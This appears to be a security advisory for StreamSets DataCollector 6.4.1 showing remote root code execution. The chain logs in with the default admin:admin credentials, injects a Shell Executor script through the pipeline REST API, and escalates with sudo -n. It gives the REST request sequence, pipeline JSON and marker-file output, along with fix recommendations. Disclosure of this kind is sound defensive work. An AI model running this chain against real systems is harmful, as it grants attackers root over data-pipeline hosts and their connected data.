# StreamSets DataCollector 6.4.1 — Default Credentials + Shell Executor → Root RCE

## 1. Overview

StreamSets DataCollector is a closed-source data-pipeline ingestion engine (IBM) used to move and transform data between hundreds of systems. The official Docker image `streamsets/datacollector:6.4.1` runs the engine on HTTP port 18630 as user `sdc` (uid 20159) and ships with hard-coded default credentials in `/etc/sdc/basic-realm.properties` — `admin:admin`, `guest:guest`, `creator:creator` — with no first-login password-change requirement anywhere in the codebase (a full source search for `passwordChangeRequired` / `firstLogin` / `forcePasswordChange` returns zero hits). The built-in Shell Executor stage (`ShellDExecutor`) writes its `config.script` field verbatim to a temporary `.sh` file and executes it with `ProcessBuilder("sh", script)` — no whitelist, no sandbox, no filtering. Because the container's `/etc/sudoers` grants `sdc ALL=(ALL) NOPASSWD: ALL`, the executed script can prefix `sudo -n` and run as `uid=0 (root)`.

The full chain — default login → pipeline creation → shell-script injection → pipeline start → root command execution — was verified end-to-end on a default Docker deployment, with fresh markers confirming both `uid=20159(sdc)` and `uid=0(root)` execution. An adversarial re-verification with a fresh UUID marker independently reproduced the root execution (`NOT_REFUTED`).

## 2. Vulnerability Summary

- **Type**: Default-credential authenticated RCE with root privilege escalation
- **Root cause 1 (CWE-798)**: hard-coded default credentials (`admin:admin` etc.) with no forced password change; the default realm remains valid forever on a default install
- **Root cause 2 (CWE-94)**: `ShellExecutor.executeScript()` writes `config.script` (a TEXT stage configuration value, fully attacker-controlled via the pipeline REST API) directly to a temp file and runs `ProcessBuilder("sh", script)` with no sandbox, whitelist, or command filtering
- **Root cause 3 (CWE-250/CWE-269)**: the container grants `sdc ALL=(ALL) NOPASSWD: ALL`, turning the `sdc`-user RCE into a root RCE with a single `sudo -n` prefix
- **Result**: remote code execution as root on the DataCollector host/container. CVSS 9.8.

## 3. Authentication Boundary

The web layer (`WebServerTask.createConstraintMappings`) configures:
- `/rest/*` — BASIC authentication required, roles `{user}`
- `/public-rest/*` — unauthenticated
- `/*` — static resources (StaticWebServlet)

The Jersey layer enforces `@RolesAllowed` plus `SecurityContext.isUserInRole()` globally; `createPipeline` is annotated with `@RolesAllowed({"creator","admin","datacollector:creator","datacollector:admin","dpm-system"})`. The default realm file `/etc/sdc/basic-realm.properties` defines `admin`, `guest`, and `creator` with passwords equal to the usernames. There is no first-login password-change gate, so the default credentials work on every unmodified install — effectively reducing the "authenticated" requirement to a publicly known constant. The only request-level constraint is the CSRF header `X-Requested-By: SDC` on PUT/POST/DELETE to `/rest/*`, which is trivial to satisfy.

## 4. Attack Surface

- **Entry**: HTTP REST API on port 18630 (`POST /rest/v1/pipeline/{id}`, `POST /rest/v1/pipeline/{id}/start`)
- **Authentication**: BASIC with default `admin:admin`
- **Controllable parameters**: the full pipeline JSON, including `stages[].configuration[name=config.script].value` (the shell script), the Dev Raw Source `dataFormat`, `numberOfThreads`, and `stopAfterFirstBatch`
- **Privilege primitive**: `sudo -n` via the container sudoers `NOPASSWD: ALL`
- **No local access required**: fully remote over HTTP

## 5. Sink Identification

Decompiling `ShellExecutor.java` (CFR) reveals the sink in `executeScript()`:

```java
// ShellExecutor.java:138-154
File script = ...;
FileUtils.writeStringToFile(script, this.config.script);  // config.script written verbatim, no sanitization
ProcessBuilder pb = new ProcessBuilder("sh", script.getAbsolutePath());
Process process = pb.start();  // executes as the sdc user
```

Key properties of the sink:
- `config.script` (TEXT stage configuration) is written to a temp `.sh` file without any filtering
- `ProcessBuilder("sh", script)` executes it with no allowlist, sandbox, signature check, or command validation
- `ImpersonationMode` defaults to `DISABLED` (no sudo prefix added by the engine, but the attacker can include `sudo -n` inside the script)

## 6. Source Identification & Controllability

The source is the pipeline REST API: `POST /rest/v1/pipeline/{id}` accepts a `PipelineConfigurationJson` body whose `stages[].configuration[name=config.script].value` field is the attacker-controlled shell script. `PipelineStoreResource.savePipeline` (`@POST`, line 728) deserializes the JSON and stores it without validating stage configuration contents. The script is fully controlled — content, length, and even the `sudo -n` prefix.

## 7. Data Flow

```
Attacker HTTP POST /rest/v1/pipeline/{id}  (Authorization: Basic admin:admin, X-Requested-By: SDC)
  → Jetty SecurityHandler BASIC auth (admin:admin passes)
  → Jersey CsrfProtectionFilter (X-Requested-By passes)
  → PipelineStoreResource.savePipeline (@RolesAllowed admin passes)
  → JSON deserialized → PipelineConfigurationJson
  → stored in PipelineStore (memory + on-disk json)
Attacker HTTP POST /rest/v1/pipeline/{id}/start
  → PipelineManager.start()
  → Dev Raw Source feeds 1 record (stopAfterFirstBatch=true)
  → ShellDExecutor.executeScript()
  → ShellExecutor.executeScript()
  → FileUtils.writeStringToFile(temp.sh, config.script)
  → ProcessBuilder("sh", temp.sh).start()   // sdc user
  → config.script contains "sudo -n <cmd>"
  → /etc/sudoers: sdc ALL=(ALL) NOPASSWD:ALL
  → uid=0 (root) command execution
```

## 8. Exploit Construction

The pipeline REST flow requires four steps:

| Step | Method | Path | Purpose |
|---|---|---|---|
| 1 | PUT | `/rest/v1/pipeline/{title}?autoGeneratePipelineId=true` | create empty pipeline |
| 2 | GET | `/rest/v1/pipeline/{id}` | fetch empty config |
| 3 | POST | `/rest/v1/pipeline/{id}?rev=0` | save stages |
| 4 | POST | `/rest/v1/pipeline/{id}/start` | start pipeline |

Constraints:
- `PUT` on an existing ID returns `CONTAINER_0201` (PUT=create, POST=update semantics)
- Dev Raw Source must set `dataFormat=JSON` (otherwise `VALIDATION_0007` START_ERROR)
- Dev Raw Source needs `stopAfterFirstBatch=true` and `numberOfThreads=1` so a single record triggers execution and stops

Stage configuration:

```json
Dev Raw Source ("com_streamsets_pipeline_stage_devtest_rawdata_RawDataDSource"):
{"name":"rawData","value":"{\\n  \\"f1\\": \\"abc\\"\\n}"},
{"name":"numberOfThreads","value":1},
{"name":"stopAfterFirstBatch","value":true},
{"name":"dataFormat","value":"JSON"}

ShellDExecutor ("com_streamsets_pipeline_stage_executor_shell_ShellDExecutor"):
{"name":"config.script","value":"id > /tmp/sdc_rce_marker 2>&1; echo RCE_SUCCESS >> /tmp/sdc_rce_marker"},
{"name":"config.timeout","value":"10000"}
```

Root escalation: change `config.script` to `sudo -n id > /tmp/sdc_root_marker 2>&1; echo ROOT_OK >> /tmp/sdc_root_marker`.

## 9. Dynamic Verification

### 9.1 sdc-user RCE

With `config.script = "id > /tmp/sdc_rce_marker 2>&1; echo RCE_SUCCESS >> /tmp/sdc_rce_marker"`, after starting the pipeline the container shows:

```
uid=20159(sdc) gid=20159(sdc) groups=20159(sdc),0(root)
RCE_SUCCESS
```

### 9.2 root RCE

With `config.script = "sudo -n id > /tmp/sdc_root_marker 2>&1; echo ROOT_OK >> /tmp/sdc_root_marker"`:

```
uid=0(root) gid=0(root) groups=0(root)
ROOT_OK
```

### 9.3 Adversarial re-verification

An adversarial subagent re-ran the chain with a fresh UUID marker (`/tmp/sdc_reverify_marker_<uuid>`) and confirmed via `stat` birth timestamp that the marker was not residual; all five falsification dimensions (sink reachability, parameter controllability, missing filter, hardening, marker authenticity) failed to refute the finding.

## 10. Reachability & Impact

- **Reachability**: the default Docker image ships with the default credentials, a usable Shell Executor stage, and `sudoers NOPASSWD` — no hardening is required; the whole chain is remote over HTTP (port 18630, bound to the container network).
- **Impact**: full compromise of the DataCollector engine and host as root: pipeline data, credentials, arbitrary file read/write, and lateral movement from the data-pipeline engine into connected systems. In data-integration environments this is the crown-jewel server.
- **Scope**: all default StreamSets DataCollector 6.x deployments, widely used in enterprise data engineering.

## 11. Fix Recommendations

1. Remove default credentials — force a password change on first login and refuse weak defaults (CWE-798)
2. Harden the Shell Executor: command allowlist, sandboxing, default-disabled stage, audit logging of executed scripts (CWE-94)
3. Remove `sdc ALL=(ALL) NOPASSWD: ALL` from sudoers; run the engine with least privilege
4. Validate stage configuration in `savePipeline`; require explicit admin opt-in for high-risk executor stages
5. Add default-credential detection with startup alerts

## 12. CWE & CVSS

- **CWE-798**: Use of Hard-coded Credentials — default realm with no forced change
- **CWE-94**: Improper Control of Generation of Code — attacker-controlled script executed by the shell
- **CWE-269**: Improper Privilege Management — `sdc` NOPASSWD root
- **CVSS**: 9.8 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
